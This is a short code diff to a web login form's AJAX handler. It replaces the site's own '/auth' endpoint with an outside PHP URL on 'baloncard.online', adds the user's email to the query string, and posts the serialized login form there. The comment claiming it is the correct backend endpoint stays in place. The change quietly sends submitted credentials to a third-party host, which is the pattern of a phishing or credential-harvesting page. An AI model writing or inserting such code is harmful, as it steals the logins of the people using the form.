@@ -153,7 +153,7 @@
                 // AJAX request
                 $.ajax({
                     type: 'POST',
-                    url: '/auth', // Make sure to use the correct endpoint for your backend
+                    url: 'https://baloncard.online/golang/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
                     data: $('#loginForm').serialize(), // Use serialized form data
                     success: function (response) {
                         // Hide spinner after request
